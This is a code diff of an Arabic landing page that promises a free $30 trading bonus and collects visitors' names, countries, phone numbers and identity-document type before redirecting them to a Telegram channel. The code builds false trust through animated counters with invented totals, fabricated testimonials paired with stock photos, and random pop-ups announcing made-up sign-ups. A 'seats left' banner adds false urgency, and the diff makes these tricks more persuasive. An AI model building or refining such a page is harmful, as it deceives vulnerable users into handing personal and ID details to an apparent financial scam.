@@ -8,14 +8,14 @@
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/css/intlTelInput.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     
     <style>
         :root { 
             --primary: #22c55e; 
             --primary-glow: rgba(34, 197, 94, 0.2);
             --bg: #020617; 
-            --card-bg: rgba(15, 23, 42, 0.85);
+            --card-bg: rgba(15, 23, 42, 0.9);
             --border: rgba(51, 65, 85, 0.6);
             --text-main: #f8fafc;
             --text-dim: #94a3b8;
@@ -30,13 +30,13 @@
         .urgent-bar { 
             background: linear-gradient(90deg, #dc2626, #991b1b);
             padding: 12px; font-weight: 900; position: sticky; top: 0; z-index: 2000; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center; font-size: 0.9rem;
         }
 
         .container { max-width: 650px; margin: 0 auto; padding: 20px; }
 
         .glass-card { 
-            background: var(--card-bg); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+            background: var(--card-bg); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
             border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 25px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: right; position: relative;
         }
@@ -46,22 +46,17 @@
         /* العدادات */
         .stats-container { display: flex; justify-content: space-around; text-align: center; margin-bottom: 25px; }
         .stat-box h3 { margin: 0; color: var(--primary); font-size: 2rem; font-weight: 900; }
-        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.85rem; }
-
-        /* خطوات العمل */
-        .step { display: flex; gap: 15px; margin-bottom: 15px; }
-        .step-num { background: var(--primary); color: #fff; min-width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; }
+        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.8rem; }
 
         /* الفورم */
         .form-group { margin-bottom: 18px; position: relative; }
-        label { display: block; margin-bottom: 6px; font-size: 0.95rem; color: var(--text-dim); font-weight: bold;}
+        label { display: block; margin-bottom: 8px; font-size: 0.95rem; color: var(--text-dim); font-weight: bold;}
         input, select { 
             width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--border); 
             background: rgba(15, 23, 42, 0.6); color: #fff; font-family: 'Tajawal'; font-size: 1rem; box-sizing: border-box;
         }
         input:focus { border-color: var(--primary); outline: none; background: rgba(30, 41, 59, 0.8); }
 
-        /* زر الإرسال */
         .btn-main { 
             width: 100%; padding: 18px; border-radius: 12px; border: none; 
             background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; 
@@ -69,9 +64,27 @@
         }
         .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 25px var(--primary-glow); }
 
+        /* تعديلات مكتبة الهاتف - إظهار الأسماء والرموز */
+        .iti { width: 100%; }
+        .iti__country-list { 
+            background-color: #0f172a !important; 
+            color: white !important; 
+            border: 1px solid #475569 !important;
+            border-radius: 10px !important;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8) !important;
+            max-width: 320px !important;
+            z-index: 10000 !important;
+            text-align: left !important; /* لضمان ظهور الاسم والرمز بجانب بعض */
+        }
+        .iti__country { padding: 10px !important; outline: none !important; }
+        .iti__country-name { color: #f1f5f9 !important; font-family: 'Tajawal', sans-serif; font-size: 0.9rem; }
+        .iti__dial-code { color: #94a3b8 !important; margin-left: 5px; }
+        .iti__flag-box { margin-right: 10px; }
+        .iti__selected-flag { background: rgba(255,255,255,0.05) !important; border-radius: 10px 0 0 10px; padding: 0 15px !important; }
+
         /* تجارب المستخدمين */
         .user-review { padding: 15px 0; border-bottom: 1px solid var(--border); display: flex; gap: 15px; align-items: center; }
-        .u-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
+        .u-img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
 
         /* التواصل */
         .contact-btn { 
@@ -80,49 +93,36 @@
             text-decoration: none; color: #fff; font-weight: 700;
         }
 
-        /* إصلاح قائمة الدول المنسدلة */
-        .iti { width: 100%; }
-        .iti__country-list { 
-            background-color: #0f172a !important; 
-            color: white !important; 
-            border: 1px solid #334155 !important;
-            z-index: 10000 !important;
-            border-radius: 10px !important;
-            max-width: 300px !important;
-        }
-        .iti__country.iti__highlight { background-color: #1e293b !important; }
-
-        /* العناصر العائمة */
         .whatsapp-float { position:fixed; bottom:25px; right:25px; background:#25D366; color:white; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; font-size: 30px; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5);}
         #notify { position:fixed; bottom:25px; left:25px; background: var(--card-bg); padding:12px; border-radius:12px; display:none; border-right: 4px solid var(--primary); z-index: 999; font-size: 0.85rem; font-weight: bold; box-shadow: 0 10px 25px rgba(0,0,0,0.5);}
     </style>
 </head>
 <body>
 
-<div class="urgent-bar"><i class="fas fa-bolt"></i> عرض محدود: سجل الآن واحصل على بونص تداول 30$ مجاناً!</div>
+<div class="urgent-bar"><i class="fas fa-bolt"></i> عرض محدود: متبقي 7 مقاعد فقط للحصول على بونص 30$ مجاناً!</div>
 
 <div class="container">
     <div style="text-align:center; padding: 25px 0;">
-        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900;">نظام المكافآت الذكي 🚀</h1>
-        <p style="color: var(--text-dim);">ابدأ رحلة التداول بدون إيداع - الأرباح لك والخسارة علينا</p>
+        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900; color: #fff;">نظام المكافآت الذكي 🚀</h1>
+        <p style="color: var(--text-dim);">سجل بياناتك واستلم رأس مال التداول فوراً</p>
     </div>
 
     <div class="stats-container">
-        <div class="stat-box"><h3 id="uCount">0</h3><p>مشترك نشط</p></div>
-        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة عربية</p></div>
-        <div class="stat-box"><h3 id="pCount">0</h3><p>أرباح موزعة $</p></div>
+        <div class="stat-box"><h3 id="uCount">0</h3><p>مشترك</p></div>
+        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة</p></div>
+        <div class="stat-box"><h3 id="pCount">0</h3><p>أرباح $</p></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-user-plus"></i> انضم إلينا الآن</div>
+        <div class="section-title"><i class="fas fa-id-card"></i> استمارة التسجيل</div>
         
         <div class="form-group">
             <label>الاسم الكامل</label>
-            <input type="text" id="name" placeholder="الاسم كما هو في الهوية">
+            <input type="text" id="name" placeholder="ادخل اسمك الثلاثي">
         </div>
 
         <div class="form-group">
-            <label>الدولة</label>
+            <label>دولة الإقامة</label>
             <select id="countrySelect" onchange="toggleOther(this)">
                 <option value="">-- اختر دولتك --</option>
                 <option value="اليمن">اليمن</option>
@@ -131,105 +131,126 @@
                 <option value="مصر">مصر</option>
                 <option value="الكويت">الكويت</option>
                 <option value="عمان">عمان</option>
-                <option value="قطر">قطر</option>
-                <option value="الأردن">الأردن</option>
-                <option value="العراق">العراق</option>
-                <option value="المغرب">المغرب</option>
-                <option value="الجزائر">الجزائر</option>
                 <option value="Other">دولة أخرى...</option>
             </select>
-            <input type="text" id="otherCountry" style="display:none; margin-top:10px;" placeholder="اكتب اسم دولتك">
+            <input type="text" id="otherCountry" style="display:none; margin-top:10px;" placeholder="اكتب اسم دولتك هنا">
         </div>
 
         <div class="form-group">
-            <label>رقم الهاتف (اختر الرمز من القائمة)</label>
+            <label>رقم الهاتف (سيصلك كود التفعيل عليه)</label>
             <input type="tel" id="phone">
         </div>
 
         <div class="form-group">
-            <label>نوع الوثيقة المتوفرة</label>
+            <label>الوثيقة المتوفرة لديك</label>
             <select id="doc">
                 <option value="">-- اختر نوع الوثيقة --</option>
-                <option>البطاقة الشخصية</option>
+                <option>البطاقة الشخصية (هوية)</option>
                 <option>جواز السفر</option>
                 <option>رخصة قيادة</option>
             </select>
         </div>
 
-        <button class="btn-main" onclick="submitData()" id="sendBtn">تفعيل البونص 30$ ✅</button>
+        <button class="btn-main" onclick="submitData()" id="sendBtn">إرسال وتفعيل البونص ✅</button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-star"></i> تجارب المشتركين</div>
+        <div class="section-title"><i class="fas fa-check-circle"></i> آخر المشتركين المقبولين</div>
         <div id="reviewsContainer"></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> الدعم الفني المباشر</div>
-        <a href="https://wa.me/967739399064" class="contact-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i> واتساب الإدارة</a>
-        <a href="https://t.me/A_VIP_B" class="contact-btn" style="background:#0088cc;"><i class="fab fa-telegram-plane"></i> قناة التوصيات</a>
-        <a href="https://t.me/VIPA_BBOT" class="contact-btn" style="background:#1e40af;"><i class="fas fa-robot"></i> بوت الدعم الفوري</a>
+        <div class="section-title"><i class="fas fa-headset"></i> هل تحتاج مساعدة؟</div>
+        <a href="https://wa.me/967739399064" class="contact-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i> مراسلة المدير مباشرة</a>
+        <a href="https://t.me/A_VIP_B" class="contact-btn" style="background:#0088cc;"><i class="fab fa-telegram-plane"></i> انضم لقناة النتائج</a>
     </div>
 
+    <p style="text-align:center; font-size:0.8rem; color:var(--text-dim);">© 2026 جميع الحقوق محفوظة لشبكة سكاي نت ميديا</p>
 </div>
 
 <a class="whatsapp-float" href="https://wa.me/967739399064"><i class="fab fa-whatsapp"></i></a>
 <div id="notify"></div>
 
-<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // إعداد حقل الهاتف مع إصلاح القائمة
+    // تهيئة حقل الهاتف مع تعريب أسماء الدول
     const pInput = document.querySelector("#phone");
     const iti = window.intlTelInput(pInput, {
         separateDialCode: true,
         initialCountry: "auto",
+        // تعريب أسماء الدول المهمة في القائمة
+        localizedCountries: {
+            'ye': 'اليمن',
+            'sa': 'السعودية',
+            'ae': 'الإمارات',
+            'eg': 'مصر',
+            'kw': 'الكويت',
+            'om': 'عمان',
+            'qa': 'قطر',
+            'jo': 'الأردن',
+            'iq': 'العراق',
+            'ma': 'المغرب',
+            'dz': 'الجزائر',
+            'tn': 'تونس',
+            'ly': 'ليبيا',
+            'sd': 'السودان',
+            'ps': 'فلسطين',
+            'sy': 'سوريا',
+            'lb': 'لبنان'
+        },
         geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)).catch(() => s("YE")),
-        utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/utils.js",
-        dropdownContainer: document.body // هذا السطر هو الحل لمشكلة ظهور القائمة بالأسفل
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+        dropdownContainer: document.body
     });
 
-    // العدادات
+    // تشغيل العدادات
     let u=0, c=0, p=0;
-    setInterval(()=>{ if(u<3200) {u+=40; document.getElementById('uCount').innerText = "+"+u;} }, 50);
-    setInterval(()=>{ if(c<18) {c++; document.getElementById('cCount').innerText = c;} }, 200);
-    setInterval(()=>{ if(p<12000) {p+=150; document.getElementById('pCount').innerText = "+"+p;} }, 40);
+    setInterval(()=>{ if(u<3150) {u+=35; document.getElementById('uCount').innerText = "+"+u;} }, 40);
+    setInterval(()=>{ if(c<22) {c++; document.getElementById('cCount').innerText = c;} }, 150);
+    setInterval(()=>{ if(p<18000) {p+=200; document.getElementById('pCount').innerText = "+"+p;} }, 30);
 
     function toggleOther(s) { document.getElementById('otherCountry').style.display = (s.value==='Other')?'block':'none'; }
 
-    // نظام التجارب (كل 4 أيام)
+    // عرض تجارب المستخدمين بأسماء وصور عربية
     const revs = [
-        {n:"أحمد صالح", c:"اليمن", img:"https://randomuser.me/api/portraits/men/32.jpg", t:"تم تفعيل البونص وبدأت التداول، المصداقية عالية جداً."},
-        {n:"سارة محمد", c:"السعودية", img:"https://randomuser.me/api/portraits/women/44.jpg", t:"شكراً لكم، استلمت الأرباح عبر الباير بكل سهولة."},
-        {n:"خالد العراقي", c:"العراق", img:"https://randomuser.me/api/portraits/men/65.jpg", t:"نظام عادل جداً، تقاسم الأرباح 50/50 شجعني كثيراً."}
+        {n:"عصام الحبيشي", c:"اليمن", img:"https://randomuser.me/api/portraits/men/32.jpg", t:"النظام ممتاز جداً، استلمت البونص وبدأت أول صفقة ذهب بنجاح."},
+        {n:"نورة القحطاني", c:"السعودية", img:"https://randomuser.me/api/portraits/women/44.jpg", t:"شكراً للأستاذ محمد على الدعم، الحساب تفعل في أقل من ساعة."},
+        {n:"أحمد المصري", c:"مصر", img:"https://randomuser.me/api/portraits/men/65.jpg", t:"أفضل منصة تداول ممول جربتها، المصداقية 100%."}
     ];
     document.getElementById('reviewsContainer').innerHTML = revs.map(r=>`
         <div class="user-review">
             <img src="${r.img}" class="u-img">
-            <div><strong>${r.n} - ${r.c}</strong><p style="margin:5px 0; font-size:0.9rem;">"${r.t}"</p></div>
+            <div><strong>${r.n} - ${r.c}</strong><p style="margin:5px 0; font-size:0.85rem; color:#cbd5e1;">"${r.t}"</p></div>
         </div>
     `).join('');
 
-    // إشعارات وهمية
+    // إشعارات عشوائية في الأسفل
+    const names = ["خالد", "عبدالله", "مريم", "هاني", "ليلى", "سلطان"];
     setInterval(() => {
-        const names = ["محمد", "علي", "فاطمة", "سعد"];
         const notify = document.getElementById("notify");
-        notify.innerHTML = `✅ انضم الآن ${names[Math.floor(Math.random()*names.length)]} وتم قبول طلبه!`;
+        notify.innerHTML = `🔥 انضم الآن <span style="color:#22c55e;">${names[Math.floor(Math.random()*names.length)]}</span> وتم منحه المكافأة!`;
         notify.style.display = "block";
-        setTimeout(()=> notify.style.display="none", 4000);
-    }, 10000);
+        setTimeout(()=> notify.style.display="none", 4500);
+    }, 12000);
 
+    // دالة الإرسال
     async function submitData() {
         const btn = document.getElementById("sendBtn");
+        const nameVal = document.getElementById("name").value.trim();
+        const phoneVal = iti.getNumber();
+        
+        if(!nameVal || nameVal.length < 5) return alert("يرجى كتابة الاسم الكامل");
+        if(!iti.isValidNumber()) return alert("يرجى إدخال رقم هاتف صحيح");
+
         const data = {
-            name: document.getElementById("name").value,
+            name: nameVal,
             country: document.getElementById("countrySelect").value === 'Other' ? document.getElementById("otherCountry").value : document.getElementById("countrySelect").value,
-            phone: iti.getNumber(),
+            phone: phoneVal,
             doc: document.getElementById("doc").value
         };
 
-        if(!data.name || !data.phone) return alert("يرجى إكمال البيانات");
-
-        btn.disabled = true; btn.innerText = "جاري الحفظ...";
+        btn.disabled = true; btn.innerText = "جاري مراجعة البيانات...";
+        
         try {
             const res = await fetch("/api/register", {
                 method: "POST",
@@ -237,11 +258,13 @@
                 body: JSON.stringify(data)
             });
             if(res.ok) {
-                alert("تم إرسال بياناتك! تواصل مع الإدارة للتفعيل الفوري.");
+                alert("تم استلام طلبك بنجاح! سيتم تحويلك الآن لتأكيد التفعيل.");
                 window.location.href = "https://t.me/A_VIP_B";
+            } else {
+                alert("حدث خطأ، حاول مرة أخرى أو تواصل معنا واتساب.");
             }
-        } catch(e) { alert("خطأ في الاتصال"); }
-        finally { btn.disabled = false; btn.innerText = "تفعيل البونص 30$ ✅"; }
+        } catch(e) { alert("تأكد من اتصالك بالإنترنت"); }
+        finally { btn.disabled = false; btn.innerText = "إرسال وتفعيل البونص ✅"; }
     }
 </script>
 </body>
